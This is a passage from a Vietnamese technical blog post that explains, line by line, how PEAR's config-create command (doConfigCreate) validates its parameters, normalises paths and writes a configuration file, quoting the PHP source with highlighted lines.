</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="hl"><span class="lnt">54
</span></span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">doConfigCreate</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$options</span><span class="p">,</span> <span class="nv">$params</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$params</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;config-create: must have 2 parameters, root path and &#39;</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;filename to save as&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$root</span> <span class="o">=</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Clean up the DIRECTORY_SEPARATOR mess
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$ds2</span> <span class="o">=</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">.</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$root</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;!\\\\+!&#39;</span><span class="p">,</span> <span class="s1">&#39;!/+!&#39;</span><span class="p">,</span> <span class="s2">&#34;!</span><span class="si">$ds2</span><span class="s2">+!&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                            <span class="k">array</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                        <span class="nv">$root</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$root</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;windows&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Root directory must be an absolute path beginning &#39;</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;with &#34;/&#34;, was: &#34;&#39;</span> <span class="o">.</span> <span class="nv">$root</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[A-Za-z]:/&#39;</span><span class="p">,</span> <span class="nv">$root</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Root directory must be an absolute path beginning &#39;</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;with &#34;\\&#34; or &#34;C:\\&#34;, was: &#34;&#39;</span> <span class="o">.</span> <span class="nv">$root</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$windows</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;windows&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$windows</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$root</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="nv">$root</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!@</span><span class="nx">touch</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Could not create &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PEAR_Config</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;#no#system#config#&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$root</span><span class="p">[</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$root</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$root</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">noRegistry</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;php_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\php</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/php&#34;</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;data_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\data</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/data&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;www_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\www</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/www&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;cfg_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\cfg</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/cfg&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;ext_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\ext</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/ext&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;doc_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\docs</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/docs&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;test_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\tests</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/tests&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;cache_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\cache</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/cache&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;download_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\download</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/download&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;temp_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\temp</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/temp&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;bin_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;man_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\man</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/man&#34;</span><span class="p">);</span>
</span></span><span class="line hl"><span class="cl">    <span class="nv">$config</span><span class="o">-&gt;</span><span class="na">writeConfigFile</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_showConfig</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ui</span><span class="o">-&gt;</span><span class="na">outputData</span><span class="p">(</span><span class="s1">&#39;Successfully created default configuration file &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$command</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hàm bắt buộc phải nhận đúng 2 tham số: <code>root path</code> và <code>filename</code>. Nếu không, trả về lỗi.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$params</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;config-create: must have 2 parameters, root path and &#39;</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;filename to save as&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$root</span> <span class="o">=</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Nếu ký tự đầu tiên của root path không phải là <code>/</code>, hàm kiểm tra xem có bật tuỳ chọn windows không.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$root</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;windows&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Root directory must be an absolute path beginning &#39;</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;with &#34;/&#34;, was: &#34;&#39;</span> <span class="o">.</span> <span class="nv">$root</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[A-Za-z]:/&#39;</span><span class="p">,</span> <span class="nv">$root</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Root directory must be an absolute path beginning &#39;</span> <span class="o">.</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;with &#34;\\&#34; or &#34;C:\\&#34;, was: &#34;&#39;</span> <span class="o">.</span> <span class="nv">$root</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$windows</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;windows&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$windows</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$root</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="nv">$root</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Nếu không phải <code>Windows</code> → bắt lỗi vì yêu cầu đường dẫn bắt đầu bằng <code>/</code>.</li>
<li>Nếu là <code>Windows</code> → kiểm tra định dạng <code>C:</code> (thông qua regex) và chuyển dấu <code>/</code> thành <code>\</code> nếu cần.</li>
</ul>
<p>Sau đó, thực hiện tạo và kiểm tra file cấu hình đầu ra</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!@</span><span class="nx">touch</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s1">&#39;Could not create &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">realpath</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Nếu file chưa tồn tại, cố gắng tạo bằng <code>touch</code>. Nếu không tạo được → lỗi.</li>
<li>Dùng <code>realpath</code> để lấy đường dẫn tuyệt đối thật sự của file.</li>
</ul>
<p>Tạo đối tượng cấu hình và chuẩn hoá $root</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$config</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PEAR_Config</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;#no#system#config#&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$root</span><span class="p">[</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$root</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$root</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$root</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">noRegistry</span><span class="p">();</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Thiết lập các giá trị đường dẫn</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;php_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\php</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/php&#34;</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;data_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\data</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/data&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;man_dir&#39;</span><span class="p">,</span> <span class="nv">$windows</span> <span class="o">?</span> <span class="s2">&#34;</span><span class="si">$root\\pear\\man</span><span class="s2">&#34;</span> <span class="o">:</span> <span class="s2">&#34;</span><span class="si">$root</span><span class="s2">/pear/man&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Cuối cùng là ghi file cấu hình, hiển thị và thông báo thành công</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="hl"><span class="lnt">1
</span></span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line hl"><span class="cl"><span class="nv">$config</span><span class="o">-&gt;</span><span class="na">writeConfigFile</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_showConfig</span><span class="p">(</span><span class="nv">$config</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ui</span><span class="o">-&gt;</span><span class="na">outputData</span><span class="p">(</span><span class="s1">&#39;Successfully created default configuration file &#34;&#39;</span> <span class="o">.</span> <span class="nv">$params</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$command</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>writeConfigFile()</code> là hàm chính dùng để ghi dữ liệu vào config file.</p>
<div class="highlight" title="/usr/local/lib/php/PEAR/Command/Config.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="hl"><span class="lnt">38
</span></span><span class="hl"><span class="lnt">39
</span></span><span class="hl"><span class="lnt">40
</span></span><span class="hl"><span class="lnt">41
</span></span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">writeConfigFile</span><span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nv">$layer</span> <span class="o">=</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="nv">$data</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_lazyChannelSetup</span><span class="p">(</span><span class="nv">$layer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$layer</span> <span class="o">==</span> <span class="s1">&#39;both&#39;</span> <span class="o">||</span> <span class="nv">$layer</span> <span class="o">==</span> <span class="s1">&#39;all&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="k">as</span> <span class="nv">$type</span> <span class="o">=&gt;</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$err</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">writeConfigFile</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$type</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">PEAR</span><span class="o">::</span><span class="na">isError</span><span class="p">(</span><span class="nv">$err</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
